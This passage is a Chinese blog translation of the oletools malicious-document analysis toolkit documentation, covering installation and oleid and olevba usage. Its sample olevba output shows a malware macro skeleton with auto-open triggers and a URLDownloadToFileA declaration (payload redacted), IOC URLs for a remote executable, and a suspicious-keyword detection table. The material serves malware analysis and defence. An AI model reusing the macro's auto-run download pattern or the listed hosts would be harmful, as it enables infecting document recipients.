<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zeronohacker</title>
  
  <subtitle>零度非安全</subtitle>
  <link href="https://zeronohacker.github.io/atom.xml" rel="self"/>
  
  <link href="https://zeronohacker.github.io/"/>
  <updated>2021-09-19T13:08:49.115Z</updated>
  <id>https://zeronohacker.github.io/</id>
  
  <author>
    <name>zeronohacker</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>恶意文档分析工具 oletools 使用说明</title>
    <link href="https://zeronohacker.github.io/2020/09/08/maldoc-analysis-tool-oletools-instructions/"/>
    <id>https://zeronohacker.github.io/2020/09/08/maldoc-analysis-tool-oletools-instructions/</id>
    <published>2020-09-08T11:42:08.000Z</published>
    <updated>2021-09-19T13:08:49.115Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文为 oletools 文档的中文版，原文链接：<a href="https://github.com/decalage2/oletools/wiki">https://github.com/decalage2/oletools/wiki</a></p></blockquote><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>oletools 是一个用来分析 Microsoft OLE2 文件的工具包，OLE2 文件是一种以结构化存储的复合二进制文件或者复合文档格式的文件，例如微软的 Office文档、Outlook 邮件信息，工具包中的工具主要被用于进行恶意软件分析、取证和调试，工具是基于 olefile 解析器的。</p><p>想要获取更多 oletools 信息，请参看 <a href="http://www.decalage.info/python/oletools">http://www.decalage.info/python/oletools</a></p><p>Microsoft OLE2 请参看 <a href="http://en.wikipedia.org/wiki/Compound_File_Binary_Format">http://en.wikipedia.org/wiki/Compound_File_Binary_Format</a></p><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/decalage2/oletools"><img src="https://github-readme-stats.vercel.app/api/pin/?username=decalage2&repo=oletools&theme=algolia&show_owner=true"/></a><h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><div class="timeline"><div class="timenode"><div class="meta"><p><p>2020-09-03 v0.56</p></p></div><div class="body"><ol><li>olevba/mraptor: 新增 trigger _OnConnecting 检测</li><li>olevba: 更新 plugin_biff 至 0.0.15 版本，完善对 Excel 4/XLM 宏解析</li><li>olevba: 完善对 MHT 的检测</li><li>olevba: 新增 <code>--no-xlm</code> 选项，可关闭对 Excel 4/XLM 宏解析</li><li>olevba: 修复在 VBA 解压原始 chunks 的 bug</li><li>oleform: 完善解析</li><li>oleobj: <code>Ole10Native</code> 现在不区分大小写</li><li>clsid: 新增 PDF 和 Microsoft Word Picture</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2019-12-16 v0.55.2</p></p></div><div class="body"><ol><li>rtfobj: 从目标控制字列表中删除 <code>\rtf</code></li><li>rtfobj: 修复 process_file 中对 Equation 类的检测</li></ol></div></div><div class="timenode"><div class="meta"><p><p>2019-12-03 v0.55</p></p></div><div class="body"><ol><li>olevba: 支持 SLK 文件和从 SLK 文件中提取的 XLM 宏检测</li><li>olevba: 支持 VBA Stomping 检测</li><li>olevba: 将 pcodedmp 集成，使之能够对 P-code 提取和反汇编</li><li>olevba: 检测 P-code 中的可疑关键字</li><li>olevba: 新增 –pcode 选项，支持显示反汇编后的 P-code</li><li>对于不支持 UTF-8 语言环境的系统，可以更好地处理 unicode，例如 LANG=C</li><li>rtfobj: 新增 CVE-2017-0199</li></ol><p>v0.55 之前的版本更新记录请自行在源码中查看 ……</p></div></div></div><h2 id="工具包中各工具简单说明"><a href="#工具包中各工具简单说明" class="headerlink" title="工具包中各工具简单说明"></a>工具包中各工具简单说明</h2><p>用来分析恶意文档的工具</p><div class="table-container"><table><thead><tr><th>工具名</th><th>用途</th></tr></thead><tbody><tr><td>oleid</td><td>用于分析 OLE 文件以便检测是否具有恶意文件的基本特征</td></tr><tr><td>olevba</td><td>从 MS Office 文档 (OLE、OpenXML) 中提取和分析 VBA 宏代码</td></tr><tr><td>MacroRaptor</td><td>检测恶意 VBA 宏</td></tr><tr><td>msodde</td><td>从 MS Office 文档、RTF 和 CSV 中提取和检测 DDE/DDEAUTO 链接</td></tr><tr><td>pyxswf</td><td>从 MS Office 文档 (例如 WORD、Excel)、RTF 中检测、提取和分析嵌入的 Flash 对象 (SWF)</td></tr><tr><td>oleobj</td><td>从 OLE 文件中提取嵌入的对象</td></tr><tr><td>rtfobj</td><td>从 RTF 文件中提取嵌入的对象</td></tr></tbody></table></div><p>用于分析 OLE 文件结构的工具</p><div class="table-container"><table><thead><tr><th>工具名</th><th>用途</th></tr></thead><tbody><tr><td>olebrowse</td><td>一个简单的 GUI 程序，用来查看和提取 OLE 文件 (例如 MS WORD、Excel 和 PPT) 中单个数据流</td></tr><tr><td>olemeta</td><td>从 OLE 文件中提取所有的标准属性，标准属性也称元数据</td></tr><tr><td>oletimes</td><td>提取所有流和存储当中创建和修改的时间戳</td></tr><tr><td>oledir</td><td>显示 OLE 文件的所有目录条目</td></tr><tr><td>olemap</td><td>以 map 的形式显示 OLE 文件中的区域</td></tr></tbody></table></div><h2 id="下载和安装"><a href="#下载和安装" class="headerlink" title="下载和安装"></a>下载和安装</h2><p>如果你想获取最新的稳定版本，请按相应平台使用 <code>pip</code> 命令安装</p><div class="tabs" id="install-stand-version"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#install-stand-version-1">Windows</button></li><li class="tab"><button type="button" data-href="#install-stand-version-2">Linux/Mac</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="install-stand-version-1"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U oletools</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="install-stand-version-2"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -H pip install -U oletools</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>如果你想获取最新的开发者安装版本，请按相应平台执行命令</p><div class="tabs" id="install-dev-version"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#install-dev-version-1">Windows</button></li><li class="tab"><button type="button" data-href="#install-dev-version-2">Linux/Mac</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="install-dev-version-1"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U https://github.com/decalage2/oletools/archive/master.zip</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="install-dev-version-2"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -H pip install -U https://github.com/decalage2/oletools/archive/master.zip</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="oleid"><a href="#oleid" class="headerlink" title="oleid"></a>oleid</h2><p>oleid 是一个用来分析 OLE 文件 (例如 MS Office 文档中的 Word、Excel) 的脚本文件，可以检测恶意文件的一般特征，举个粟子，比如能够检测 VBA 宏和嵌入的 Flash 对象。</p><h3 id="主要特性"><a href="#主要特性" class="headerlink" title="主要特性"></a>主要特性</h3><p>oleid 的主要特性</p><ul><li>检测 OLE 文件类型</li><li>检测 VBA 宏</li><li>检测嵌入的 Flash 对象</li><li>检测嵌入的 OLE 对象</li><li>检测加密的 MS Office</li><li>能用作一个命令行工具</li><li>将 Python API 集成到应用程序中</li></ul><p>计划要完善的地方</p><ul><li>提取更多的 metadata 重要域</li><li>支持 OpenXML 文件和嵌入的 OLE 文件</li><li>通用 VBA 宏检测</li><li>检测自动执行的 VBA 宏</li><li>扩展 OLE 文件类型的检测</li><li>检测不同寻常的 OLE 结构</li><li>可对多个文件扫描</li><li>可对压缩文件内的文件扫描</li><li>CSV 格式输出</li></ul><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oleid &lt;file&gt;</span><br></pre></td></tr></table></figure><p>举个粟子，比如检测 VBA 宏和嵌入的 Flash 对象</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">C:\oletools&gt;oleid word_flash_vba.doc</span><br><span class="line">Filename: word_flash_vba.doc</span><br><span class="line">+-------------------------------+-----------------------+</span><br><span class="line">| Indicator                     | Value                 |</span><br><span class="line">+-------------------------------+-----------------------+</span><br><span class="line">| OLE format                    | True                  |</span><br><span class="line">| Has SummaryInformation stream | True                  |</span><br><span class="line">| Application name              | Microsoft Office Word |</span><br><span class="line">| Encrypted                     | False                 |</span><br><span class="line">| Word Document                 | True                  |</span><br><span class="line">| VBA Macros                    | True                  |</span><br><span class="line">| Excel Workbook                | False                 |</span><br><span class="line">| PowerPoint Presentation       | False                 |</span><br><span class="line">| Visio Drawing                 | False                 |</span><br><span class="line">| ObjectPool                    | True                  |</span><br><span class="line">| Flash objects                 | 1                     |</span><br><span class="line">+-------------------------------+-----------------------+</span><br></pre></td></tr></table></figure><h3 id="在-Python-程序中如何使用-oleid"><a href="#在-Python-程序中如何使用-oleid" class="headerlink" title="在 Python 程序中如何使用 oleid"></a>在 Python 程序中如何使用 oleid</h3><p>首先，需要导入 oletools.oleid 模块，然后创建一个 OleID 对象来扫描一个文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> oletools.oleid</span><br><span class="line">oid = oletools.oleid.OleID(filename)</span><br></pre></td></tr></table></figure><div class="tip "><p>注意：filename 参数可以是一个文件名，也可以是一个类文件对象或者是要分析的文件里所包含的一个字节类字符串</p></div><p>完成上述操作后，接下来就是要去调用 check() 方法，这个方法会返回 Indicator 对象，每个 Indicator 对象都有如下这些属性</p><ul><li>id: Indicator 的标识符，字符串类型</li><li>name: Indicator 的名称，字符串类型</li><li>description: Indicator 的描述，字符串类型</li><li>type: Indicator 的类，比如 bool、str、int</li><li>value: Indicator 的值</li></ul><p>举个粟子，下面这段代码显示所有的 Indicator</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">indicators = oid.check()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> indicators:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Indicator id=%s name=&quot;%s&quot; type=%s value=%s&#x27;</span> % (i.<span class="built_in">id</span>, i.name, i.<span class="built_in">type</span>, <span class="built_in">repr</span>(i.value))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;description:&#x27;</span>, i.description</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>想要获取更多详细细节，请自行参看 oleid.py 源码。</p><h2 id="olevba"><a href="#olevba" class="headerlink" title="olevba"></a>olevba</h2><p>olevba 是一个用来解析 OLE 和 OpenXML 文件的脚本文件，可以提取和检测 VBA 宏，也可用来检测与安全相关的指标，比如自动执行宏，VBA 可疑关键字，反沙箱和反虚拟化技术，IOCs (IP 地址、URLs、可执行文件名等等)。它还可以检测和解码运用了几种常见的混淆方法的字符串，包括 <strong>Hex、StrReverse、Base64、Dridex、VBA expressions</strong>，并可以从解码后的字符串提取 IOCs。XLM/Excel 4 宏在 Excel 和 SLK 文件中也受支持。</p><h3 id="支持的文件格式"><a href="#支持的文件格式" class="headerlink" title="支持的文件格式"></a>支持的文件格式</h3><ul><li>Word 97-2003 (.doc, .dot), Word 2007+ (.docm, .dotm)</li><li>Excel 97-2003 (.xls), Excel 2007+ (.xlsm, .xlsb)</li><li>PowerPoint 97-2003 (.ppt), PowerPoint 2007+ (.pptm, .ppsm)</li><li>Word/PowerPoint 2007+ XML</li><li>Word 2003 XML (.xml)</li><li>Word/Excel Single File Web Page / MHTML (.mht)</li><li>Publisher (.pub)</li><li>SYLK/SLK 文件 (.slk)</li><li>包含 VBA 的文本文件或者 VBScript 源代码</li><li>对以上文件的有密码保护的压缩包</li></ul><h3 id="主要特性-1"><a href="#主要特性-1" class="headerlink" title="主要特性"></a>主要特性</h3><p>olevba 主要特性</p><ul><li>能对 MS Office 97-2003，2007+，XML 和 MHT 文件检测</li><li>提取 VBA 宏代码</li><li>检测自动执行宏</li><li>检测 VBA 宏中的可疑关键字</li><li>检测反沙箱和反虚拟化技术</li><li>能够检测和解码那些经过 <code>Hex/Base64/StrReverse/Dridex</code> 编码后的字符串</li><li>使用 pyparsing 内置的 VBA 解析器可对任意编码组合 (Chr、Asc、Val、StrReverse、Environ、+、&amp;、自定义的 Hex 和 Base64 加密) 的字符串做去混淆处理</li><li>提取 IOCs 或其它你感兴趣的一些特征，比如 IP 地址、URLs、E-Mail 和可执行文件名</li><li>扫描多个文件和样本集</li><li>分类模式能显示多个文件的摘要视图</li><li>能够对压缩后的带密码保护的包进行扫描</li><li>在你的应用程序中可使用 olevba 中的 Python API</li></ul><div class="tip "><p>提示：加密后的 MS Office 的文档也是支持的，因为 VBA 宏实际并没有加密，只是文档的内容加密。</p></div><h3 id="关于-VBA-宏"><a href="#关于-VBA-宏" class="headerlink" title="关于 VBA 宏"></a>关于 VBA 宏</h3><p>可参看 <a href="http://www.decalage.info/en/vba_tools">这篇文章</a> 来获取更多关于 VBA 宏的信息和技术以及它们是怎样在 MS Office 文档存储的。</p><h3 id="olevba-是如何工作的"><a href="#olevba-是如何工作的" class="headerlink" title="olevba 是如何工作的"></a>olevba 是如何工作的</h3><p>olevba 大体的运行流程如下</p><ul><li>检测文件的类型，看是否为 OLE 文件，如果为 OLE 文件则立马解析</li><li>如果它是一个压缩文件类型，则为 MS Office 2007+、XML 或 MHTML 文件，olevba 能够从中 (比如 vbaProject.bin、editdata.mso) 获取到所有的 ole 对象文件并打开</li><li>olevba 能够确定存储在 OLE 结构中的的有 VBA Projects</li><li>解析每个 VBA Project以便查找包含宏代码的相应 OLE 流</li><li>在每个 OLE 流中，VBA 宏代码会被提取和解压出来</li><li>olevba 会去查找经过诸如 <code>Hex/Base64/StrReverse/Dridex/VBA expressions</code> 算法编码后的字符串</li><li>olevba 扫描宏代码，去混淆，查找可疑的关键字、自动执行宏和 IOCs (URLs、IP 地址、E-Mail 地址、可执行文件名等等)</li></ul><h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Usage: olevba [options] &lt;filename&gt; [filename2 ...]</span><br><span class="line">Options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -r                    find files recursively in subdirectories.</span><br><span class="line">  -z ZIP_PASSWORD, --zip=ZIP_PASSWORD</span><br><span class="line">                        if the file is a zip archive, open all files from it,</span><br><span class="line">                        using the provided password.</span><br><span class="line">  -p PASSWORD, --password=PASSWORD</span><br><span class="line">                        if encrypted office files are encountered, try</span><br><span class="line">                        decryption with this password. May be repeated.</span><br><span class="line">  -f ZIP_FNAME, --zipfname=ZIP_FNAME</span><br><span class="line">                        if the file is a zip archive, file(s) to be opened</span><br><span class="line">                        within the zip. Wildcards * and ? are supported.</span><br><span class="line">                        (default:*)</span><br><span class="line">  -a, --analysis        display only analysis results, not the macro source</span><br><span class="line">                        code</span><br><span class="line">  -c, --code            display only VBA source code, do not analyze it</span><br><span class="line">  --decode              display all the obfuscated strings with their decoded</span><br><span class="line">                        content (Hex, Base64, StrReverse, Dridex, VBA).</span><br><span class="line">  --attr                display the attribute lines at the beginning of VBA</span><br><span class="line">                        source code</span><br><span class="line">  --reveal              display the macro source code after replacing all the</span><br><span class="line">                        obfuscated strings by their decoded content.</span><br><span class="line">  -l LOGLEVEL, --loglevel=LOGLEVEL</span><br><span class="line">                        logging level debug/info/warning/error/critical</span><br><span class="line">                        (default=warning)</span><br><span class="line">  --deobf               Attempt to deobfuscate VBA expressions (slow)</span><br><span class="line">  --relaxed             Do not raise errors if opening of substream fails</span><br><span class="line">  Output mode (mutually exclusive):</span><br><span class="line">    -t, --triage        triage mode, display results as a summary table</span><br><span class="line">                        (default for multiple files)</span><br><span class="line">    -d, --detailed      detailed mode, display full results (default for</span><br><span class="line">                        single file)</span><br><span class="line">    -j, --json          json mode, detailed in json format (never default)</span><br></pre></td></tr></table></figure><div class="tip "><p>提示：在 v0.54 新版本中，-p 选项被用来解密那些加了密的文档</p></div><h3 id="一些粟子"><a href="#一些粟子" class="headerlink" title="一些粟子"></a>一些粟子</h3><p>扫描单个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba file.doc</span><br></pre></td></tr></table></figure><p>扫描一个加了密的的 zip 压缩文件，密码为 <code>infected</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba malicious_file.xls.zip -z infected</span><br></pre></td></tr></table></figure><p>扫描单个文件，显示所有混淆字符串被解码后的结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba file.doc --decode</span><br></pre></td></tr></table></figure><p>扫描单个文件，显示 VBA 字符串去混淆后的宏代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba file.doc --reveal</span><br></pre></td></tr></table></figure><p>扫描提取后的宏代码文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba source_code.vba</span><br></pre></td></tr></table></figure><p>扫描一个文件夹下的所有文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba &quot;MalwareZoo/VBA/*&quot;</span><br></pre></td></tr></table></figure><div class="tip "><p>提示：在 Linux、MacOSX 或其它类 Unix 系统上，在通配符旁必须添加双引号，否则会被当作 shell 命令</p></div><p>在所有子目录中递归扫描所有的 .doc 和 .xls 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba &quot;MalwareZoo/VBA/*.doc&quot; &quot;MalwareZoo/VBA/*.xls&quot; -r</span><br></pre></td></tr></table></figure><p>在带有密码的压缩包内递归扫描所有的 .doc 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olevba &quot;MalwareZoo/VBA/*.zip&quot; -r -z infected -f &quot;*.doc&quot;</span><br></pre></td></tr></table></figure><h3 id="详细分析模式-默认单个文件"><a href="#详细分析模式-默认单个文件" class="headerlink" title="详细分析模式 (默认单个文件)"></a>详细分析模式 (默认单个文件)</h3><p>当单个文件被扫描或使用 -d 选项时，分析的所有详细细节将会被罗列出来，比如下面扫描 DIAN_caso-5415.doc.zip 这个恶意文件时</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">olevba c:\MalwareZoo\VBA\DIAN_caso-5415.doc.zip -z infected</span></span><br><span class="line">===============================================================================</span><br><span class="line">FILE: DIAN_caso-5415.doc.malware in c:\MalwareZoo\VBA\DIAN_caso-5415.doc.zip</span><br><span class="line">Type: OLE</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">VBA MACRO ThisDocument.cls</span><br><span class="line">in file: DIAN_caso-5415.doc.malware - OLE stream: Macros/VBA/ThisDocument</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">Option Explicit</span><br><span class="line">Private Declare Function URLDownloadToFileA Lib &quot;urlmon&quot; (ByVal FVQGKS As Long,_</span><br><span class="line">ByVal WSGSGY As String, ByVal IFRRFV As String, ByVal NCVOLV As Long, _</span><br><span class="line">ByVal HQTLDG As Long) As Long</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">Sub Auto_Open()</span><br><span class="line">SNVJYQ</span><br><span class="line">End Sub</span><br><span class="line">Public Sub SNVJYQ()</span><br><span class="line">    [Malicious Code...]</span><br><span class="line">End Sub</span><br><span class="line">Function OGEXYR(XSTAHU As String, PHHWIV As String) As Boolean</span><br><span class="line">    [Malicious Code...]</span><br><span class="line">    Application.DisplayAlerts = False</span><br><span class="line">    Application.Quit</span><br><span class="line">End Function</span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><br><span class="line">ANALYSIS:</span><br><span class="line">+------------+----------------------+-----------------------------------------+</span><br><span class="line">| Type       | Keyword              | Description                             |</span><br><span class="line">+------------+----------------------+-----------------------------------------+</span><br><span class="line">| AutoExec   | AutoOpen             | Runs when the Word document is opened   |</span><br><span class="line">| AutoExec   | Auto_Open            | Runs when the Excel Workbook is opened  |</span><br><span class="line">| AutoExec   | Workbook_Open        | Runs when the Excel Workbook is opened  |</span><br><span class="line">| Suspicious | Lib                  | May run code from a DLL                 |</span><br><span class="line">| Suspicious | Shell                | May run an executable file or a system  |</span><br><span class="line">|            |                      | command                                 |</span><br><span class="line">| Suspicious | Environ              | May read system environment variables   |</span><br><span class="line">| Suspicious | URLDownloadToFileA   | May download files from the Internet    |</span><br><span class="line">| IOC        | http://germanya.com. | URL                                     |</span><br><span class="line">|            | ec/logs/test.exe&quot;    |                                         |</span><br><span class="line">| IOC        | http://germanya.com. | URL                                     |</span><br><span class="line">|            | ec/logs/counter.php&quot; |                                         |</span><br><span class="line">| IOC        | germanya.com         | Executable file name                    |</span><br><span class="line">| IOC        | test.exe             | Executable file name                    |</span><br><span class="line">| IOC        | sfjozjero.exe        | Executable file name                    |</span><br><span class="line">+------------+----------------------+-----------------------------------------+</span><br></pre></td></tr></table></figure><h3 id="分流模式-默认多个文件"><a href="#分流模式-默认多个文件" class="headerlink" title="分流模式 (默认多个文件)"></a>分流模式 (默认多个文件)</h3><p>当多个文件被扫描或使用 -t 选项时，每个文件的概要信息会被罗列出来，<strong>这对于快速分类可疑文件集合更为方便</strong>。下面为分析结果中显示的标志说明</p><ul><li>OLE：文件类型为 OLE，比如 MS Office 97-2003</li><li>OpX：文件类型为 OpenXML，比如 MS Office 2007+</li><li>XML：文件类型为 Word 2003 XML</li><li>MHT：文件类型为 Word MHTML，即 .mht 文件</li><li>?：不支持的文件类型</li><li>M：包含 VBA 宏</li><li>A：自动执行宏</li><li>S：可疑的 VBA 关键字</li><li>I：IOCs</li><li>H：Hex 编码的字符串</li><li>B：Base64 编码的字符串</li><li>D：Dridex 编码的字符串</li><li>V：VBA expressions 字符串</li></ul><p>下面举个粟子</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">c:\&gt;olevba \MalwareZoo\VBA\samples\*</span><br><span class="line">Flags       Filename</span><br><span class="line">----------- -----------------------------------------------------------------</span><br><span class="line">OLE:MASI--- \MalwareZoo\VBA\samples\DIAN_caso-5415.doc.malware</span><br><span class="line">OLE:MASIH-- \MalwareZoo\VBA\samples\DRIDEX_1.doc.malware</span><br><span class="line">OLE:MASIH-- \MalwareZoo\VBA\samples\DRIDEX_2.doc.malware</span><br><span class="line">OLE:MASI--- \MalwareZoo\VBA\samples\DRIDEX_3.doc.malware</span><br><span class="line">OLE:MASIH-- \MalwareZoo\VBA\samples\DRIDEX_4.doc.malware</span><br><span class="line">OLE:MASIH-- \MalwareZoo\VBA\samples\DRIDEX_5.doc.malware</span><br><span class="line">OLE:MASIH-- \MalwareZoo\VBA\samples\DRIDEX_6.doc.malware</span><br><span class="line">OLE:MAS---- \MalwareZoo\VBA\samples\DRIDEX_7.doc.malware</span><br><span class="line">OLE:MASIH-- \MalwareZoo\VBA\samples\DRIDEX_8.doc.malware</span><br><span class="line">OLE:MASIHBD \MalwareZoo\VBA\samples\DRIDEX_9.xls.malware</span><br><span class="line">OLE:MASIH-- \MalwareZoo\VBA\samples\DRIDEX_A.doc.malware</span><br><span class="line">OLE:------- \MalwareZoo\VBA\samples\Normal_Document.doc</span><br><span class="line">OLE:M------ \MalwareZoo\VBA\samples\Normal_Document_Macro.doc</span><br><span class="line">OpX:MASI--- \MalwareZoo\VBA\samples\RottenKitten.xlsb.malware</span><br><span class="line">OLE:MASI-B- \MalwareZoo\VBA\samples\ROVNIX.doc.malware</span><br><span class="line">OLE:MA----- \MalwareZoo\VBA\samples\Word within Word macro auto.doc</span><br></pre></td></tr></table></figure><h3 id="支持-Python3-——-olevba3"><a href="#支持-Python3-——-olevba3" class="headerlink" title="支持 Python3 —— olevba3"></a>支持 Python3 —— olevba3</h3><p>自从 v0.54 版本以来，olevba 完全兼容 Python2 和 Python3，因此 olevba3 就没必要再去使用了，但是为了向下兼容，还是将它保留了。</p><h3 id="在-Python-应用程序中如何使用-olevba"><a href="#在-Python-应用程序中如何使用-olevba" class="headerlink" title="在 Python 应用程序中如何使用 olevba"></a>在 Python 应用程序中如何使用 olevba</h3><p>olevba 可被用来打开一个 MS Office 文件，检测它是否包含 VBA 宏，并可以提取和分析宏代码。</p><div class="tip "><p>注意：olevba 目前正在积极开发中，因此有些 API 会发生更改</p></div><span class='p blue'>导入 olevba</span><p>首先，需导入 oletools.olevba 包，至少得用到 VBA_Parser 和 VBA_Scanner 类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> oletools.olevba <span class="keyword">import</span> VBA_Parser, TYPE_OLE, TYPE_OpenXML, TYPE_Word2003_XML, TYPE_MHTML</span><br></pre></td></tr></table></figure><span class='p blue'>用 VBA_Parser 解析 MS Office 文件</span><p>解析一个 MS Office 文件，需创建 VBA_Parser 类的实例，并提供要打开的文件所在路径作为参数，例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vbaparser = VBA_Parser(<span class="string">&#x27;my_file_with_macros.doc&#x27;</span>)</span><br></pre></td></tr></table></figure><p>此外，也能将此文件里的数据作为字节类型字符串参数，在这种情况下，文件名必须提供，例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">myfile = <span class="string">&#x27;my_file_with_macros.doc&#x27;</span></span><br><span class="line">filedata = <span class="built_in">open</span>(myfile, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">vbaparser = VBA_Parser(myfile, data=filedata)</span><br></pre></td></tr></table></figure><p>如果文件不是受支持的格式，例如 